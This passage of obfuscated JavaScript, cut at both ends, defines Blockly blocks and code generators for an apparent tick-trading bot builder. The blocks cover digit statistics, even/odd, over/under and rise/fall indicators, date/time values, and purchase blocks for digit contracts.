    options: [["Ask price", "askprice"], ["Payout", "payout"], ["Profit", "profit"], ["Contract type", "contracttype"], ["Entry time", "entrytime"], ["Entry value", "entryvalue"], ["Entry value string", "entryvaluestring"], ["Exit time", "exittime"], ["Exit value", "exitvalue"], ["Exit value string", "exitvaluestring"], ["Barrier", "barrier"], ["Result", "result"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lastcontractdetail = function (_0x5d1026, _0x398075) {
  var _0x83277c = _0x5d1026.getFieldValue("dropdown_lastcontractdetail_A");
  var _0x32f928 = "lastCont_" + _0x83277c;
  if (["askprice", "payout", "profit", "entryvalue", "exitvalue"].includes(_0x83277c)) {
    _0x32f928 += "*1";
  }
  return [_0x32f928, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lastdigit",
  message0: "Last Digit",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lastdigit = function (_0x4e28e7, _0x47b6a7) {
  var _0x3878c7 = "digitArrayUtama.at(-1)*1";
  return [_0x3878c7, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001lastdigitlist",
  message0: "1001 Last Digit List",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001lastdigitlist"] = function (_0xf8d1f1, _0x550988) {
  var _0x45e362 = "digitArrayUtama";
  return [_0x45e362, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "thelast10digits",
  message0: "Last 10 digits: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_thelast10digits_A",
    options: [["Digit", "digit"], ["Tick move", "tickmove"], ["Change", "change"], ["Digit move", "digitmove"], ["Digit caterzian", "digitgraph"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_thelast10digits_B",
    options: [["List", "list"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.thelast10digits = function (_0x3df132, _0x4aa202) {
  var _0x3ad4ec = _0x3df132.getFieldValue("dropdown_thelast10digits_A");
  var _0x432d96 = _0x3df132.getFieldValue("dropdown_thelast10digits_B");
  var _0x490c2c;
  if (_0x432d96 == "list") {
    _0x490c2c = "thelast10digits_" + _0x3ad4ec + "_list";
  } else {
    _0x490c2c = "document.getElementById(\"thelast10digits_" + _0x3ad4ec + "_" + _0x432d96 + "\").innerText";
    if (["digit", "change", "digitgraph"].includes(_0x3ad4ec)) {
      _0x490c2c += "*1";
    }
  }
  return [_0x490c2c, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "digitstatisticsetnoofticks",
  message0: "Digit statistic | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.digitstatisticsetnoofticks = function (_0x51ae1a, _0xfdef2f) {
  var _0x194d43 = _0x51ae1a.getFieldValue("row_nya");
  var _0x3056af = _0xfdef2f.valueToCode(_0x51ae1a, "ticks_nya", javascript.Order.ATOMIC);
  var _0x4f288e = "digitstatistic_noofticks[" + _0x194d43 + "].value=" + _0x3056af + "*1;";
  return _0x4f288e;
};
Blockly.defineBlocksWithJsonArray([{
  type: "digitstatistic",
  message0: "Digit statistic: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_digitstatistic_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"], ["Summary", "summ"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_digitstatistic_B",
    options: [["List", "list"], ["Digit 0", "0"], ["Digit 1", "1"], ["Digit 2", "2"], ["Digit 3", "3"], ["Digit 4", "4"], ["Digit 5", "5"], ["Digit 6", "6"], ["Digit 7", "7"], ["Digit 8", "8"], ["Digit 9", "9"], ["Least", "least"], ["Most", "most"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.digitstatistic = function (_0x201e0a, _0x4d1aa6) {
  var _0xaadea5 = _0x201e0a.getFieldValue("dropdown_digitstatistic_A");
  var _0x1cd551 = _0x201e0a.getFieldValue("dropdown_digitstatistic_B");
  var _0x867398;
  if (_0x1cd551 == "list") {
    if (_0xaadea5 == "summ") {
      _0x867398 = "digitstatistic_list[7]";
    } else {
      _0x867398 = "digitstatistic_list[" + _0xaadea5 + "]";
    }
  } else {
    _0x867398 = "document.getElementById(\"digitstatistic_" + _0xaadea5 + "_" + _0x1cd551 + "\").innerText";
    if (["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(_0x1cd551)) {
      _0x867398 += "*1";
    }
  }
  return [_0x867398, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "caterzian20",
  message0: "Caterzian 20: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_caterzian20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.caterzian20 = function (_0x4b12f6, _0x5bfe2d) {
  var _0x2c48cf = _0x4b12f6.getFieldValue("dropdown_caterzian20_B");
  var _0x181af8;
  if (_0x2c48cf == "list") {
    _0x181af8 = "thelast20digits_digitcater_list";
  } else {
    _0x181af8 = "document.getElementById(\"thelast20digits_digitcater_" + _0x2c48cf + "\").innerText*1";
  }
  return [_0x181af8, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenodd20",
  message0: "Even / odd 20: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_evenodd20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenodd20 = function (_0x1c9c2c, _0x2194ea) {
  var _0x475b64 = _0x1c9c2c.getFieldValue("dropdown_evenodd20_B");
  var _0x4cac64;
  if (_0x475b64 == "list") {
    _0x4cac64 = "thelast20digits_digitevenodd_list";
  } else {
    _0x4cac64 = "document.getElementById(\"thelast20digits_digitevenodd_" + _0x475b64 + "\").innerText";
  }
  return [_0x4cac64, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenvsoddsetnoofticks",
  message0: "Even VS Odd | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenvsoddsetnoofticks = function (_0x5070e7, _0x40fb7d) {
  var _0x56a805 = _0x5070e7.getFieldValue("row_nya");
  var _0x1dec49 = _0x40fb7d.valueToCode(_0x5070e7, "ticks_nya", javascript.Order.ATOMIC);
  var _0x2e1e97 = "evenvsodd_noofticks[" + _0x56a805 + "].value=" + _0x1dec49 + "*1;";
  return _0x2e1e97;
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenvsodd",
  message0: "Even VS Odd: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_evenvsodd_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_evenvsodd_B",
    options: [["Even(%)", "even"], ["Odd(%)", "odd"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenvsodd = function (_0x13aee2, _0x1e2eee) {
  var _0x2ad9e3 = _0x13aee2.getFieldValue("dropdown_evenvsodd_A");
  var _0x2df9d5 = _0x13aee2.getFieldValue("dropdown_evenvsodd_B");
  var _0x371b5e = "document.getElementById(\"evenvsodd_" + _0x2ad9e3 + "_" + _0x2df9d5 + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [_0x371b5e, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsundersetnoofticks",
  message0: "Over VS Under | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsundersetnoofticks = function (_0x5836cd, _0x498917) {
  var _0x10ed54 = _0x5836cd.getFieldValue("row_nya");
  var _0x3bce02 = _0x498917.valueToCode(_0x5836cd, "ticks_nya", javascript.Order.ATOMIC);
  var _0x10ac6b = "overvsunder_noofticks[" + _0x10ed54 + "].value=" + _0x3bce02 + "*1;";
  return _0x10ac6b;
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsundersetdigit",
  message0: "Over VS Under | Set %1 %2 %3",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row 1", "1"], ["Row 2", "2"]]
  }, {
    type: "field_dropdown",
    name: "type_nya",
    options: [["Over", "over"], ["Under", "under"]]
  }, {
    type: "input_value",
    name: "digit_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsundersetdigit = function (_0x903b5, _0x36fd5b) {
  var _0xd3660e = _0x903b5.getFieldValue("row_nya");
  var _0xb971d4 = _0x903b5.getFieldValue("type_nya");
  var _0x552f8a = _0x36fd5b.valueToCode(_0x903b5, "digit_nya", javascript.Order.ATOMIC);
  var _0x2f6a66 = "document.getElementById(\"overvsunder_" + _0xd3660e + "_" + _0xb971d4 + "digit\").value=" + _0x552f8a + ";";
  return _0x2f6a66;
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsunder",
  message0: "Over VS Under: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_overvsunder_A",
    options: [["Row#1", "1"], ["Row#2", "2"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_overvsunder_B",
    options: [["Over(%)", "over"], ["Under(%)", "under"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsunder = function (_0x1092c3, _0x3882af) {
  var _0x36d9f4 = _0x1092c3.getFieldValue("dropdown_overvsunder_A");
  var _0x1c125b = _0x1092c3.getFieldValue("dropdown_overvsunder_B");
  var _0xe474e7 = "document.getElementById(\"overvsunder_" + _0x36d9f4 + "_" + _0x1c125b + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [_0xe474e7, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lasttick",
  message0: "Last Tick",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lasttick = function (_0x204286, _0x52e223) {
  var _0x52738f = "tickArrayUtama.at(-1)*1";
  return [_0x52738f, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lasttickstring",
  message0: "Last Tick String",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lasttickstring = function (_0x177822, _0x2dc506) {
  var _0x4485ab = "tickArrayUtamaText.at(-1)";
  return [_0x4485ab, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001tickslist",
  message0: "1001 Ticks List",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001tickslist"] = function (_0x288cee, _0x3e8369) {
  var _0x1d52be = "tickArrayUtama";
  return [_0x1d52be, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001ticksstringlist",
  message0: "1001 Ticks String List",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001ticksstringlist"] = function (_0x25b985, _0x47022f) {
  var _0x18ffdd = "tickArrayUtamaText";
  return [_0x18ffdd, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "thelast10ticks",
  message0: "Last 10 ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_thelast10ticks_A",
    options: [["Tick", "tick"], ["Move", "move"], ["Worm", "worm"], ["Sentiment", "sentiment"], ["Change", "change"], ["%", "%"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_thelast10ticks_B",
    options: [["List", "list"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.thelast10ticks = function (_0x18ef65, _0x351f51) {
  var _0x2f028d = _0x18ef65.getFieldValue("dropdown_thelast10ticks_A");
  var _0x4138b9 = _0x18ef65.getFieldValue("dropdown_thelast10ticks_B");
  var _0x314a45;
  if (_0x4138b9 == "list") {
    if (_0x2f028d == "%") {
      _0x314a45 = "thelast10ticks_changeperc_list";
    } else {
      _0x314a45 = "thelast10ticks_" + _0x2f028d + "_list";
    }
  } else {
    _0x314a45 = "document.getElementById(\"thelast10ticks_" + _0x2f028d + "_" + _0x4138b9 + "\").innerText";
    if (["tick", "change", "%"].includes(_0x2f028d)) {
      _0x314a45 += "*1";
    }
  }
  return [_0x314a45, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "tickworm20",
  message0: "Worm 20: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_tickworm20_A",
    options: [["History (worm head)", "history"], ["Current", "current"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_tickworm20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.tickworm20 = function (_0x4ab1f5, _0x48d39f) {
  var _0x1013ff = _0x4ab1f5.getFieldValue("dropdown_tickworm20_A");
  var _0x2bafd0 = _0x4ab1f5.getFieldValue("dropdown_tickworm20_B");
  var _0x95ff34;
  if (_0x2bafd0 == "list") {
    _0x95ff34 = "thelast20tickworm_" + _0x1013ff + "_list";
  } else {
    _0x95ff34 = "document.getElementById(\"thelast20tickworm_" + _0x1013ff + "_" + _0x2bafd0 + "\").innerText";
  }
  return [_0x95ff34, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "risevsfallsetnoofticks",
  message0: "Rise VS Fall | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.risevsfallsetnoofticks = function (_0x5cb4e6, _0x5799e2) {
  var _0x6664e = _0x5cb4e6.getFieldValue("row_nya");
  var _0x206167 = _0x5799e2.valueToCode(_0x5cb4e6, "ticks_nya", javascript.Order.ATOMIC);
  var _0x27d361 = "risevsfall_noofticks[" + _0x6664e + "].value=" + _0x206167 + "*1;";
  return _0x27d361;
};
Blockly.defineBlocksWithJsonArray([{
  type: "risevsfall",
  message0: "Rise VS Fall: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_risevsfall_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_risevsfall_B",
    options: [["Rise(%)", "rise"], ["Fall(%)", "fall"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.risevsfall = function (_0x445a09, _0x38b56b) {
  var _0x56e383 = _0x445a09.getFieldValue("dropdown_risevsfall_A");
  var _0x48c4ed = _0x445a09.getFieldValue("dropdown_risevsfall_B");
  var _0x29a0d6 = "document.getElementById(\"risevsfall_" + _0x56e383 + "_" + _0x48c4ed + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [_0x29a0d6, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "inpTickTrismasetperiod",
  message0: "Triple SMA ticks | Set period %1 : %2",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["SMA#1", "1"], ["SMA#2", "2"], ["SMA#3", "3"]]
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.inpTickTrismasetperiod = function (_0x3ac292, _0x572dfa) {
  var _0x29939e = _0x3ac292.getFieldValue("row_nya");
  var _0x3ba013 = _0x572dfa.valueToCode(_0x3ac292, "period_nya", javascript.Order.ATOMIC);
  var _0x42da65 = "inpTickTrisma_period[" + _0x29939e + "].value=" + _0x3ba013 + "*1;";
  return _0x42da65;
};
Blockly.defineBlocksWithJsonArray([{
  type: "ticktrisma",
  message0: "Triple SMA ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_ticktrisma_A",
    options: [["SMA#1", "1"], ["SMA#2", "2"], ["SMA#3", "3"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_ticktrisma_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.ticktrisma = function (_0x251f7e, _0x223290) {
  var _0x2442d4 = _0x251f7e.getFieldValue("dropdown_ticktrisma_A");
  var _0x4beb24 = _0x251f7e.getFieldValue("dropdown_ticktrisma_B");
  var _0x450380;
  if (_0x4beb24 == "list") {
    _0x450380 = "tick_sma_list[" + _0x2442d4 + "]";
  } else {
    _0x450380 = "document.getElementById(\"tick_sma" + _0x2442d4 + "_" + _0x4beb24 + "\").innerText*1";
  }
  return [_0x450380, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "detail3ticks",
  message0: "Detail 3 ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_detail3ticks_A",
    options: [["1st last tick", "1"], ["2nd last tick", "2"], ["3rd last tick", "3"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_detail3ticks_B",
    options: [["1st", "1"], ["2nd", "2"], ["3rd", "3"], ["4th", "4"], ["5th", "5"], ["6th", "6"], ["7th", "7"], ["8th", "8"], ["9th", "9"], ["10th", "10"], ["11th", "11"], ["12th", "12"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.detail3ticks = function (_0x5d7d60, _0x197b7b) {
  var _0x34447a = _0x5d7d60.getFieldValue("dropdown_detail3ticks_A");
  var _0x5f0e6d = _0x5d7d60.getFieldValue("dropdown_detail3ticks_B");
  var _0x9571d4 = "document.getElementById(\"detail3ticks_" + _0x34447a + "_" + _0x5f0e6d + "\").innerText";
  if (!isNaN(document.getElementById("detail3ticks_" + _0x34447a + "_" + _0x5f0e6d).innerText)) {
    _0x9571d4 += "*1";
  }
  return [_0x9571d4, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "getstataccu",
  message0: "Get Stats ACCUMULATOR %1 Market: %2 %3 Growth Rate % [1-5]: %4 Tick List : %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarketAccu
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "growthRate_nya"
  }, {
    type: "input_value",
    name: "arrTick_nya",
    check: "Array"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.getstataccu = function (_0x2dee93, _0x568094) {
  var _0x1da6ac = _0x2dee93.getFieldValue("market_nya");
  var _0x2250b2 = _0x1da6ac == "activemarket" ? "mainSymbol" : _0x1da6ac == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x1da6ac.split("|")[0] + "\"";
  var _0x40a3bb = _0x568094.valueToCode(_0x2dee93, "growthRate_nya", javascript.Order.ATOMIC);
  var _0x5d41b0 = _0x568094.valueToCode(_0x2dee93, "arrTick_nya", javascript.Order.ATOMIC);
  var _0x5299eb = "getStatAccu(" + _0x5d41b0 + "," + _0x2250b2 + "," + _0x40a3bb + ")";
  return [_0x5299eb, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "datetime",
  message0: "Date/Time: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_datetime",
    options: [["Year", "year"], ["Month", "month"], ["Date", "date"], ["Hours", "hours"], ["Minutes", "minutes"], ["Seconds", "seconds"], ["Time Zone", "timezone"], ["Seconds Since Epoch", "secondssinceepoch"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.datetime = function (_0x2dfdee, _0x263c8e) {
  var _0x525b3d = _0x2dfdee.getFieldValue("dropdown_datetime");
  var _0x446852;
  switch (_0x525b3d) {
    case "year":
      _0x446852 = "new Date().getFullYear()";
      break;
    case "month":
      _0x446852 = "(new Date().getMonth())*1+1";
      break;
    case "date":
      _0x446852 = "new Date().getDate()";
      break;
    case "hours":
      _0x446852 = "new Date().getHours()";
      break;
    case "minutes":
      _0x446852 = "new Date().getMinutes()";
      break;
    case "seconds":
      _0x446852 = "new Date().getSeconds()";
      break;
    case "timezone":
      _0x446852 = "\"GMT\"+((new Date().getTimezoneOffset())==0 ? \"\" : ((new Date().getTimezoneOffset())<0 ? \"+\" : \"-\")+Math.abs(new Date().getTimezoneOffset()/60))";
      break;
    case "secondssinceepoch":
      _0x446852 = "Math.floor(new Date().getTime()/1000)";
      break;
  }
  return [_0x446852, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_diff_match",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [1-10] %9 Last Digit Prediction: [0-9] %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Differs", "DIGITDIFF"], ["Digit Matches", "DIGITMATCH"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "ldp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_diff_match = function (_0x19ef4b, _0x387c66) {
  var _0x16ca3c = _0x19ef4b.getFieldValue("selcontract_nya");
  var _0x239dbc = _0x19ef4b.getFieldValue("market_nya");
  var _0x23e442 = _0x239dbc == "activemarket" ? "mainSymbol" : _0x239dbc == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x239dbc.split("|")[0] + "\"";
  var _0x53bc65 = _0x19ef4b.getFieldValue("account_nya");
  var _0xb3e93a = _0x19ef4b.getFieldValue("stakeAM_nya");
  var _0x5b361f = _0x387c66.valueToCode(_0x19ef4b, "stake_nya", javascript.Order.ATOMIC);
  if (_0x5b361f.toString().length == 0) {
    _0x5b361f = 1;
  }
  ;
  var _0x3651d7 = _0x387c66.valueToCode(_0x19ef4b, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x3e93aa = _0x387c66.valueToCode(_0x19ef4b, "ldp_nya", javascript.Order.ATOMIC);
  var _0x21ccb7 = "mainPurchase(\"" + _0x53bc65 + "\",\"" + _0xb3e93a + "\"," + _0x5b361f + ",\"" + _0x16ca3c + "\"," + _0x23e442 + "," + _0x3651d7 + ",\"t\",0,0,0," + _0x3e93aa + ",0,0,0,0,0,0,0,0);";
  return _0x21ccb7;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_over_under",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [1-10] %9 Last Digit Prediction: [Over:0-8] [Under:1-9] %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Over", "DIGITOVER"], ["Digit Under", "DIGITUNDER"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "ldp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_over_under = function (_0x41d131, _0x5c3931) {
  var _0x3a43d2 = _0x41d131.getFieldValue("selcontract_nya");
  var _0x578b2e = _0x41d131.getFieldValue("market_nya");
  var _0x12167d = _0x578b2e == "activemarket" ? "mainSymbol" : _0x578b2e == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x578b2e.split("|")[0] + "\"";
  var _0x6b4571 = _0x41d131.getFieldValue("account_nya");
  var _0x54a060 = _0x41d131.getFieldValue("stakeAM_nya");
  var _0x457c5a = _0x5c3931.valueToCode(_0x41d131, "stake_nya", javascript.Order.ATOMIC);
  if (_0x457c5a.toString().length == 0) {
    _0x457c5a = 1;
  }
  ;
  var _0x524564 = _0x5c3931.valueToCode(_0x41d131, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x3c78cc = _0x5c3931.valueToCode(_0x41d131, "ldp_nya", javascript.Order.ATOMIC);
  var _0x2f300e = "mainPurchase(\"" + _0x6b4571 + "\",\"" + _0x54a060 + "\"," + _0x457c5a + ",\"" + _0x3a43d2 + "\"," + _0x12167d + "," + _0x524564 + ",\"t\",0,0,0,0," + _0x3c78cc + "," + _0x3c78cc + ",0,0,0,0,0,0);";
  return _0x2f300e;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_even_odd",
